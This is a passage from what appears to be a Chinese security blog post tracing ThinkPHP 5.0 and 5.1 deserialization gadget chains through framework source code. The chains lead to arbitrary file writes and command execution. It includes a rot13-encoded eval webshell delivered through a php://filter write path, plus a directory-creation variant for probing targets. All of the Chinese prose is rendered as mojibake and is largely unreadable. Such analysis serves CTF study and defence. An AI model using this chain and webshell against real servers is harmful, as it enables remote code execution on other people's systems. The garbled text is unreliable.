class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹å‰æ›¾ç»è¯´è¿‡rceæ—¶ç¼“å­˜æ–‡ä»¶åä¸å¯æ§ã€‚ä½†æ˜¯åœ¨ååºåˆ—åŒ–ä¸­å°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">($name, $auto = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨å­ç›®å½•</span></span><br><span class="line">        $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($name, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">        $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åæ¥è‡ª<code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code>.å¯æ§ã€‚<br>æˆ‘ä»¬å†çœ‹æ–‡ä»¶å†…å®¹å¦‚ä½•æ§åˆ¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯popé“¾æœ€å¤§çš„éš¾ç‚¹äº†ã€‚<code>$data</code>å…¶å®å¹¶ä¸å¯æ§ã€‚å…·ä½“å¯ä»¥å›æº¯åˆ°æˆ‘åˆšåˆšä¸Šé¢æ”¾çš„ä¸€è¿ä¸²è°ƒç”¨writeæ–¹æ³•çš„æºç å¤„ã€‚æ³¨æ„åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>writeç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™æ­»çš„<code>true</code>ã€‚å®ƒä¼šä¸€è·¯ä¼ åˆ°Fileç±»ä½œä¸º<code>$data</code>å†™å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å†™æ–‡ä»¶ç­‰äºæ§åˆ¶ä¸äº†å†™å…¥å†…å®¹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰å…³ç³»ã€‚setåœ¨è¿™ä¸ªfile_put_contentsä¸‹è¿˜è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°setTagItem</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        $key       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(<span class="string">','</span>, array_unique($value));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = $name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set($key, $value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¸€æ¬¡è°ƒç”¨äº†<code>set</code>ã€‚å¹¶ä¸”ä¸¤ä¸ªå‚æ•°å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€åå¾ªç¯è°ƒç”¨æˆ‘ä»¬å°±çŸ¥é“,å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º<code>md5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;</code>ã€‚å†…å®¹ä¸º<code>$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p><p>å½“ç„¶ã€‚è¿™é‡Œæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªç»•è¿‡æ­»äº¡exitçš„é—®é¢˜ã€‚ä½¿ç”¨rot13å³å¯ã€‚ç„¶årot13çš„payloadç»•ä¸è¿‡é»˜è®¤çš„çŸ­æ ‡ç­¾ã€‚æ‰€ä»¥ä¼šéœ€è¦åŠ è¿‡æ»¤å™¨ç»„åˆæ‹³ã€‚é™¤äº†å¸¸è§çš„base64ï¼ŒWMCTFä¸­ä½¿ç”¨åˆ°å…¶ä»–çš„<code>iconv</code>æˆ–è€…å…¶ä»–ç»„åˆä¹Ÿæ˜¯å¯è¡Œçš„ã€‚<br>åŸç†ä¸å†èµ˜è¿°<br>é‚£ä¹ˆã€‚æ§åˆ¶payloadåªè¦æ§åˆ¶Fileç±»<code>$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;</code>å³å¯ã€‚</p><p>æ‰§è¡Œexpæ‰“çš„è¯ã€‚ä¼šå‘ç°å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ã€‚è¿™æ˜¯ä¸Šé¢æˆ‘ä»¬è°ƒç”¨äº†ä¸¤æ¬¡<code>set</code>çš„ç¼˜æ•…ã€‚è€Œæ–‡ä»¶åç”±æˆ‘ä»¬çš„<code>$tag</code>å†³å®šã€‚å…·ä½“è®¡ç®—æ–¹æ³•ä¹Ÿåœ¨ä¸Šé¢æåŠäº†ã€‚å½“ç„¶æœ€å¥½çš„æ–¹æ³•æ°¸è¿œæ˜¯æœ¬åœ°è‡ªå·±æ‰“ä¸€éã€‚è¿™æ ·æ‰èƒ½ç¡®ä¿¡æ–‡ä»¶åè¿™ç§è¿œç¨‹ä¸å¯è§çš„ä¸œè¥¿ã€‚</p><p>å¦å¤–æˆ‘ç›¸ä¿¡å¤§å®¶è‚¯å®šå‘ç°è¿™ä¸ªpopé“¾æœ‰ä¸ªå˜æ‹›ã€‚é‚£å°±æ˜¯linux,windowsé€šç”¨çš„å†™ç›®å½•ã€‚å›åˆ°ä¸Šé¢getCacheKey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$dir = dirname($filename);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦æŠŠ<code>$this-&gt;options[&#39;path&#39;]</code>è®¾ç½®ä¸ºç›®å½•çš„è¯ã€‚ç›´æ¥å¯ä»¥å†™755æƒé™ç›®å½•ã€‚</p><p>SCTF2020 è€ƒå¯Ÿtp5.024é‚£é“é¢˜å½“æ—¶ä½¿ç”¨äº†pythonè„šæœ¬é«˜å¼ºåº¦åˆ æ–‡ä»¶ã€‚å¯¼è‡´æˆ‘ä»¥ä¸ºå½“å‰ç›®å½•ä¸å¯å†™ã€‚ä½†æ˜¯æ¢æˆå†™ç›®å½•çš„payloadåå‘ç°å¯ä»¥åˆ›å»ºç›®å½•ã€‚å¹¶ä¸”å¯ä»¥å­˜åœ¨ç›¸åŒäºé¶æœºé‡å¯æ—¶é—´çš„3åˆ†é’Ÿã€‚æ‰€ä»¥ä½¿ç”¨è¿™ç§payloadé»‘ç›’æ¢æµ‹ä¸å¤±ä¸ºä¸€ç§åŠæ³•ã€‚</p><h2 id="tp5-1-x-unserialize"><a href="#tp5-1-x-unserialize" class="headerlink" title="tp5.1.x-unserialize"></a>tp5.1.x-unserialize</h2><p>ä»Šå¤©æ¥è·Ÿä¸‹5.1çš„popé“¾ã€‚ç›¸æ¯”5.0è€Œè¨€æ€è·¯å¤§è‡´ç›¸åŒã€‚åªæœ‰å‡ ä¸ªç±»çš„åŒºåˆ«ã€‚å¹¶ä¸”å…¶expå·²ç»é›†æˆåˆ°phpggcä¸Šäº†ã€‚</p><p>è¿˜æ˜¯ä»èµ·ç‚¹å¼€å§‹çœ‹ã€‚è·Ÿæ˜¨å¤©5.0çš„é“¾å­æ˜¯ä¸€æ ·çš„ã€‚ä»Windowsç±»å¼€å§‹ã€‚ç„¶å=&gt;file_exists =&gt; <strong>toString()ã€‚ç„¶åæ¥ç€å…¨å±€æœç´¢ã€‚æ­¤å¤„åˆ©ç”¨Conversionçš„</strong>toString() =&gt; __toJson() =&gt; toArray()<br>è€Œä¸æ˜¯5.0ä¸­çš„Modelç±»</p><p>çœ‹åˆ°thinkphp\library\think\model\concern\Conversion.php<br>ä¸­çš„<code>toArray()</code> .æˆ‘ä»¬åŒæ ·å¯»æ‰¾å¯ä»¥è§¦å‘<code>__call()</code>çš„ä»£ç </p><p><img src="/2020/08/05/Thinkphp-vuln/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ­¤å¤„ä¸»è¦æ˜¯<code>$relation-&gt;visible($name)</code>ä¼šè§¦å‘<code>__call</code>.é€‰æ‹©è¿™ä¸€å¤„çš„ä»£ç æ˜¯å› ä¸º,relationæ¥è‡ª<code>$this-&gt;getRelation($key)</code>.<code>$name</code>æ¥è‡ª<code>$this-&gt;append</code>.<br>çœ‹åˆ°getRelation</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è¿›å…¥<code>visble</code>çš„åˆ†æ”¯ã€‚å¿…é¡»è¦<code>$relation</code>ä¸ºç©ºã€‚æ‰€ä»¥<code>$this-&gt;relation</code>ç›´æ¥ç½®ç©ºå³å¯ã€‚</p><p>æ­¤æ—¶<code>$relation</code>ç”±<code>$relation = $this-&gt;getAttr($key);</code>å†³å®šã€‚å®ƒä¼šä¾æ¬¡è°ƒç”¨\thinkphp\library\think\model\concern\Attribute.php çš„getAttr()ä¸getData()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $notFound = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ç¡®è®¤æˆ‘ä»¬çš„<code>$relation</code>æ¥è‡ªAttributeç±»çš„<code>$this-&gt;data[$name]</code>.</p><p>ç°åœ¨éœ€è¦æ³¨æ„çš„æ˜¯ã€‚æˆ‘ä»¬å¿…é¡»å¾—æ‰¾åˆ°ä¸€ä¸ªæ—¢èƒ½è°ƒç”¨Conversionè¿˜èƒ½è°ƒç”¨Attributeå±æ€§çš„ç±»ã€‚å³ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»çš„å­ç±»ã€‚è¿™ä¸ªå…¶å®å°±æ˜¯æˆ‘ä»¬ä¹‹å‰5.0é“¾å­ä¸­ç”¨è¿‡çš„Model.phpã€‚<br>åŠ ä¸ŠModelæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç¼–å†™expä¸­ä½¿ç”¨å®ƒçš„å­ç±»Pivotå®ä¾‹åŒ–ã€‚è¿™ç‚¹ä¸å¿…å¤šè¯´ã€‚</p><p>æ¥ä¸‹æ¥çœ‹<code>$relation-&gt;visible($name)</code>ä¸­çš„<code>$name</code>.å®ƒæ˜¯éå†<code>$this-&gt;append</code>å¾—åˆ°çš„ã€‚å¯æ§ã€‚åªéœ€æ³¨æ„å°†å…¶èµ‹å€¼ä¸ºæ•°ç»„å³å¯ã€‚(å› ä¸ºè¦è¿›å…¥<code>if (is_array($name))</code>çš„åˆ†æ”¯)</p><p>æ—¢ç„¶å·²ç»æ‹¥æœ‰è§¦å‘<code>__call</code>çš„æ¡ä»¶äº†ã€‚æˆ‘ä»¬ç°åœ¨æ‰¾ä¸€ä¸ªå¯ç”¨çš„<code>__call</code>ã€‚5.1ç‰ˆæœ¬ä¸­çš„gadgetå°±æ˜¯æ¥è‡ªRequestç±»çš„<code>__call</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶<code>$this-&gt;hook</code>å¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶ä¸º<code>[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]</code>è¿™ä¸ªæ•°ç»„ä»»æ„è°ƒç”¨æ–¹æ³•ã€‚ä½†æ˜¯æ³¨æ„<code>array_unshift($args, $this)</code>ä¼šå¼ºè¡ŒæŠŠ<code>$this</code>æ”¾åˆ°<code>$args</code>æ•°ç»„çš„ç¬¬ä¸€ä½ã€‚å…¶åæœæ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹<code>call_user_func_array</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,<span class="string">"arbitrary method"</span>],[<span class="keyword">$this</span>,$arg])</span><br><span class="line">=&gt;</span><br><span class="line">$obj-&gt;$func(<span class="keyword">$this</span>,$argv)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•æ‰§è¡Œå‡ ä¹æ²¡æœ‰ã€‚æ‰€ä»¥è¿™å°±é™åˆ¶æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªä¸å—è¿™ç§è°ƒç”¨æ–¹å¼å½±å“çš„å‡½æ•°ã€‚</p><p>åœ¨ä»¥å‰tp5çš„æ¼æ´åˆ†æä¸­,æ›¾ç»ç”¨åˆ°è¿‡<code>think\Request</code>ç±»ä¸­çš„input æ–¹æ³•ã€‚é‡Œé¢æœ‰<code>call_user_func($filter,$data)</code>å¯ä»¥ç”¨äºå‘½ä»¤æ‰§è¡Œã€‚<br>ä½†æ˜¯å‰é¢è¯´è¿‡ï¼Œ <code>$args</code> æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ input æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ input çš„æ–¹æ³•ã€‚</p><p>æ•´ä¸ªRequestç±»ä¸­ä¸€å…±æœ‰7å¤„è°ƒç”¨inputæ–¹æ³•çš„å…¶ä»–æ–¹æ³•ã€‚æˆ‘ä»¬é€‰æ‹©<code>param</code>æ–¹æ³•ä¸ºä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>input</code>æ–¹æ³•ä½†æ˜¯åªæœ‰ä¸€ä¸ª<code>$param</code>æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥è¿˜è¦ç»§ç»­æ‰¾è°ƒç”¨<code>param</code>çš„æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result   = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isAjaxæ–¹æ³•è¿”å›å€¼ç”±<code>$this-&gt;config[&#39;var_ajax&#39;]</code>æ§åˆ¶ã€‚é‚£ä¹ˆç­‰äºæ§åˆ¶äº†paramçš„å‚æ•°<code>$name</code>.ç­‰äºæ§åˆ¶äº†input çš„å‚æ•°<code>$name</code>.</p><p>æœ€åå†æ¥åˆ°inputæ–¹æ³•è¿™çœ‹è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span 